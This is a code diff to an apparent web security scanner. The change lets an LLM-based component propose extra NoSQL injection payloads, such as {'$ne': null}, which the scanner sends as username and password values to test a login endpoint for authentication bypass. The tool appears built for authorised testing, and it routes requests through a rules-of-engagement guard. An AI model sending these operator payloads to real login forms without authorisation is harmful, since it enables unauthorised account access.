@@ -96,6 +96,31 @@ def _looks_bypassed(resp, baseline):
     return (resp.get("body") or "") != (baseline.get("body") or "")
 
 
+def _augmented_nosql_payloads(login_url):
+    try:
+        from ..brains import payload_author
+        objs = payload_author.propose_objects(
+            "nosql_auth_bypass",
+            '{"label": "ne_null", "op": {"$ne": null}}',
+            {"target": login_url}, capability="nosql", cap=8)
+    except Exception:
+        objs = []
+    extra = []
+    for o in objs:
+        op = o.get("op")
+        if (isinstance(op, dict) and op
+                and all(isinstance(k, str) and k.startswith("$") for k in op)):
+            extra.append((str(o.get("label") or "llm"), op))
+    seen = set()
+    out = []
+    for label, op in extra + list(NOSQL_PAYLOADS):
+        key = json.dumps(op, sort_keys=True, default=str)
+        if key not in seen:
+            seen.add(key)
+            out.append((label, op))
+    return out
+
+
 def scan(login_url, headers=None, roe_guard=None, timeout=8,
          username_field="username", password_field="password"):
     verify = _verify_tls()
@@ -108,7 +133,7 @@ def scan(login_url, headers=None, roe_guard=None, timeout=8,
 
     attempts = []
     findings = []
-    for label, op in NOSQL_PAYLOADS:
+    for label, op in _augmented_nosql_payloads(login_url):
         body = {username_field: op, password_field: op}
         r = _post(login_url, body, headers, timeout, verify, roe_guard)
         if r.get("blocked"):
